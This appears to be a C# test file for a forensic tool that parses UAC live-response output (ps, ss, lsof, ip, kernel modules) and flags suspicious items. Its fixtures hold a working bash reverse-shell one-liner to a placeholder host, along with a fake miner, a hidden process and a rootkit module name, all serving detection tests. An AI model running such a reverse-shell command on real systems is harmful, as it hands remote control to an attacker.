using ArtefactForge.Core.Linux;

namespace ArtefactForge.Tests;

/// <summary>
/// UAC live_response output. The fixtures follow the exact layout of each command's output, taken
/// from the commands UAC runs (ps -eo ...lstart,args, ss -anp, ip addr show, lsof -nPl,
/// ls -l /proc/[0-9]*), with made-up hosts, users and addresses.
/// </summary>
public class LiveResponseTests
{
    private static string Write(TempDirectory dir, string relative, string text)
    {
        var path = dir.File(Path.Combine(["root", "_UAC", "live_response", .. relative.Split('/')]));
        File.WriteAllText(path, text.Replace("\r\n", "\n"));
        return path;
    }

    private static (string Out, string Log, string Errors) Run(TempDirectory dir)
    {
        var output = Path.Combine(dir.Path, "out");
        using var log = new StringWriter();
        using var errors = new StringWriter();
        Assert.Equal(0, LiveResponseExport.Run(Path.Combine(dir.Path, "root"), output, log, errors, CancellationToken.None));
        return (output, log.ToString(), errors.ToString());
    }

    private static List<Dictionary<string, string>> Csv(string path) => CsvReader.Read(path);

    private const string Ps =
        "USER         PID    PPID %CPU %MEM TT       STAT                  STARTED COMMAND\n" +
        "root           1       0  0.0  0.1 ?        Ss   Sun Oct 11 09:00:01 2026 /sbin/init splash\n" +
        "alice       4242       1  9.5  0.3 ?        S    Sun Oct 11 10:15:07 2026 /tmp/.x/kworkerd -c  /tmp/.x/c.conf\n" +
        "www-data    5150    5100  0.0  0.0 ?        S    Sun Oct 11 10:20:00 2026 bash -c bash -i >& /dev/tcp/192.0.2.66/4444 0>&1\n";

    private const string ProcListing =
        "/proc/1:\n" +
        "total 0\n" +
        "lrwxrwxrwx  1 root root  0 Oct 11 10:30 cwd -> /\n" +
        "lrwxrwxrwx  1 root root  0 Oct 11 10:30 exe -> /usr/lib/systemd/systemd\n" +
        "\n" +
        "/proc/4242:\n" +
        "total 0\n" +
        "lrwxrwxrwx  1 alice alice 0 Oct 11 10:30 cwd -> /tmp/.x\n" +
        "lrwxrwxrwx  1 alice alice 0 Oct 11 10:30 exe -> /tmp/.x/kworkerd (deleted)\n" +
        "\n" +
        "/proc/7777:\n" +
        "total 0\n" +
        "lrwxrwxrwx  1 root root  0 Oct 11 10:30 exe -> /dev/shm/hidden\n";

    [Fact]
    public void Processes_carry_their_executable_hash_and_what_needs_review()
    {
        using var dir = new TempDirectory();
        Write(dir, "process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt", Ps);
        Write(dir, "process/ls_-l_proc.txt", ProcListing);
        Write(dir, "process/hash_running_processes.md5",
            "0123456789abcdef0123456789abcdef  /proc/1/exe\nfedcba9876543210fedcba9876543210  /proc/4242/exe\n");

        var (output, _, errors) = Run(dir);

        Assert.Equal("", errors);
        var rows = Csv(Path.Combine(output, "LinuxLiveResponse_Processes.csv"));
        var init = rows.Single(r => r["PID"] == "1");
        Assert.Equal("2026-10-11 09:00:01", init["StartedLocal"]);
        Assert.Equal("/usr/lib/systemd/systemd", init["Exe"]);
        Assert.Equal("0123456789abcdef0123456789abcdef", init["ExeMD5"]);
        Assert.Equal("", init["Review"]);

        var miner = rows.Single(r => r["PID"] == "4242");
        // The command line keeps its own spacing.
        Assert.Equal("/tmp/.x/kworkerd -c  /tmp/.x/c.conf", miner["CommandLine"]);
        Assert.Equal("yes", miner["ExeDeleted"]);
        Assert.Equal("/tmp/.x/kworkerd", miner["Exe"]);
        Assert.Contains("deleted", miner["Review"]);
        Assert.Contains("temporary", miner["Review"]);

        Assert.Contains("one-liner", rows.Single(r => r["PID"] == "5150")["Review"]);

        // In /proc, missing from ps: listed and marked.
        var hidden = rows.Single(r => r["PID"] == "7777");
        Assert.Contains("in /proc but not in ps", hidden["Review"]);
        Assert.Equal("/dev/shm/hidden", hidden["Exe"]);
    }

    [Fact]
    public void A_ps_line_in_an_unexpected_format_is_reported_not_dropped_silently()
    {
        using var dir = new TempDirectory();
        Write(dir, "process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt",
            Ps + "garbled line\n");

        var (_, _, errors) = Run(dir);

        Assert.Contains("1 line(s) not in the expected ps format", errors);
    }

    [Fact]
    public void Sockets_are_read_from_ss_with_their_owning_processes()
    {
        using var dir = new TempDirectory();
        Write(dir, "network/ss_-anp.txt",
            "Netid State  Recv-Q Send-Q    Local Address:Port    Peer Address:Port Process\n" +
            "u_str ESTAB  0      0      /run/systemd/journal/stdout 23456  * 23455 users:((\"systemd\",pid=1,fd=40))\n" +
            "tcp   LISTEN 0      128          0.0.0.0:22           0.0.0.0:*     users:((\"sshd\",pid=812,fd=3))\n" +
            "tcp   ESTAB  0      0         192.0.2.10:22       198.51.100.7:51234 users:((\"sshd\",pid=900,fd=4),(\"sshd\",pid=902,fd=4))\n" +
            "tcp   LISTEN 0      4096            [::]:8080              [::]:*\n");

        var (output, _, errors) = Run(dir);

        Assert.Equal("", errors);
        var rows = Csv(Path.Combine(output, "LinuxLiveResponse_Network.csv"));
        Assert.Equal(3, rows.Count);
        var session = rows[1];
        Assert.Equal(("192.0.2.10", "22", "198.51.100.7", "51234"),
                     (session["LocalAddress"], session["LocalPort"], session["RemoteAddress"], session["RemotePort"]));
        Assert.Equal("900, 902", session["PIDs"]);
        Assert.Equal("sshd", session["Processes"]);
        Assert.Equal("::", rows[2]["LocalAddress"]);
    }

    [Fact]
    public void Netstat_is_read_when_there_is_no_ss()
    {
        using var dir = new TempDirectory();
        Write(dir, "network/netstat_-anp.txt",
            "Active Internet connections (servers and established)\n" +
            "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n" +
            "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd: /usr/sbin\n" +
            "udp        0      0 0.0.0.0:68              0.0.0.0:*                           640/dhclient\n");

        var (output, _, _) = Run(dir);

        var rows = Csv(Path.Combine(output, "LinuxLiveResponse_Network.csv"));
        Assert.Equal(("LISTEN", "812", "sshd: /usr/sbin"), (rows[0]["State"], rows[0]["PIDs"], rows[0]["Processes"]));
        Assert.Equal(("", "640", "dhclient"), (rows[1]["State"], rows[1]["PIDs"], rows[1]["Processes"]));
    }

    [Fact]
    public void Interface_addresses_routes_and_neighbours_are_tabled()
    {
        using var dir = new TempDirectory();
        Write(dir, "network/ip_addr_show.txt",
            "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n" +
            "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n" +
            "    inet 127.0.0.1/8 scope host lo\n" +
            "       valid_lft forever preferred_lft forever\n" +
            "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n" +
            "    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff\n" +
            "    inet 192.0.2.10/24 brd 192.0.2.255 scope global eth0\n" +
            "    inet6 fe80::5054:ff:fe12:3456/64 scope link\n" +
            "3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default\n" +
            "    link/ether 02:42:ac:11:00:01 brd ff:ff:ff:ff:ff:ff\n");
        Write(dir, "network/ip_route_show.txt", "default via 192.0.2.1 dev eth0 proto dhcp src 192.0.2.10 metric 100\n");
        Write(dir, "network/ip_neighbor_show.txt", "192.0.2.1 dev eth0 lladdr 52:54:00:aa:bb:cc REACHABLE\n");

        var (output, _, _) = Run(dir);

        var interfaces = Csv(Path.Combine(output, "LinuxLiveResponse_Interfaces.csv"));
        Assert.Equal(4, interfaces.Count);
        Assert.Contains(interfaces, r => r["Interface"] == "eth0" && r["Address"] == "192.0.2.10/24"
                                         && r["MAC"] == "52:54:00:12:34:56" && r["State"] == "UP");
        Assert.Contains(interfaces, r => r["Interface"] == "docker0" && r["Address"] == "");
        var route = Assert.Single(Csv(Path.Combine(output, "LinuxLiveResponse_Routes.csv")));
        Assert.Equal(("default", "192.0.2.1", "eth0"), (route["Destination"], route["Gateway"], route["Interface"]));
        var neighbour = Assert.Single(Csv(Path.Combine(output, "LinuxLiveResponse_Neighbours.csv")));
        Assert.Equal(("192.0.2.1", "52:54:00:aa:bb:cc", "REACHABLE"), (neighbour["Address"], neighbour["MAC"], neighbour["State"]));
    }

    [Fact]
    public void Lsof_columns_are_placed_by_position_and_deleted_files_marked()
    {
        using var dir = new TempDirectory();
        Write(dir, "process/lsof_-nPl.txt",
            "COMMAND     PID   TID TASKCMD   USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME\n" +
            "systemd       1                    0  cwd       DIR  253,0     4096       2 /\n" +
            "kworkerd   4242                 1000  txt       REG  253,0   812345  131090 /tmp/.x/kworkerd (deleted)\n" +
            "kworkerd   4242  4243 kworkerd  1000    3u     IPv4  51234      0t0     TCP 192.0.2.10:40000->203.0.113.9:3333 (ESTABLISHED)\n" +
            "nginx      1500                   33  DEL       REG    0,1             2051 /dev/zero\n");

        var (output, _, errors) = Run(dir);

        Assert.Equal("", errors);
        var rows = Csv(Path.Combine(output, "LinuxLiveResponse_OpenFiles.csv"));
        Assert.Equal(4, rows.Count);
        Assert.Equal(("systemd", "1", "0", "cwd", "DIR", "/"),
                     (rows[0]["Command"], rows[0]["PID"], rows[0]["User"], rows[0]["FD"], rows[0]["Type"], rows[0]["Name"]));
        Assert.Equal("yes", rows[1]["Deleted"]);
        Assert.Equal("1000", rows[2]["User"]);
        Assert.Equal("192.0.2.10:40000->203.0.113.9:3333 (ESTABLISHED)", rows[2]["Name"]);
        Assert.Equal("yes", rows[3]["Deleted"]);
    }

    [Fact]
    public void Kernel_modules_carry_their_taint_flags_explained()
    {
        using var dir = new TempDirectory();
        Write(dir, "process/proc/modules.txt",
            "ext4 999424 1 - Live 0x0000000000000000\n" +
            "diamorphine 16384 0 - Live 0x0000000000000000 (OE)\n" +
            "nf_nat 61440 2 xt_MASQUERADE,nft_chain_nat, Live 0x0000000000000000\n");

        var (output, _, _) = Run(dir);

        var rows = Csv(Path.Combine(output, "LinuxLiveResponse_KernelModules.csv"));
        var rootkit = rows.Single(r => r["Module"] == "diamorphine");
        Assert.Equal("OE", rootkit["TaintFlags"]);
        Assert.Contains("unsigned", rootkit["TaintMeaning"]);
        Assert.Equal("xt_MASQUERADE,nft_chain_nat", rows.Single(r => r["Module"] == "nf_nat")["UsedBy"]);
    }

    [Fact]
    public void Every_live_response_file_is_indexed_with_what_read_it()
    {
        using var dir = new TempDirectory();
        Write(dir, "process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt", Ps);
        Write(dir, "network/iptables_-L_-v_-n.txt", "Chain INPUT (policy ACCEPT 0 packets, 0 bytes)\n");

        var (output, _, _) = Run(dir);

        var index = Csv(Path.Combine(output, "LinuxLiveResponse_Index.csv"));
        Assert.Equal("LinuxLiveResponse_Processes.csv",
                     index.Single(r => r["File"] == "process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt")["ParsedInto"]);
        var iptables = index.Single(r => r["File"] == "network/iptables_-L_-v_-n.txt");
        Assert.Equal(("network", "", "1"), (iptables["Category"], iptables["ParsedInto"], iptables["Lines"]));
    }

    [Fact]
    public void Nothing_is_written_without_a_live_response_folder()
    {
        using var dir = new TempDirectory();
        dir.Dir(Path.Combine("root", "etc"));

        var (output, log, errors) = Run(dir);

        Assert.Equal("", errors);
        Assert.Contains("No live_response folder", log);
        Assert.False(Directory.Exists(output));
    }
}
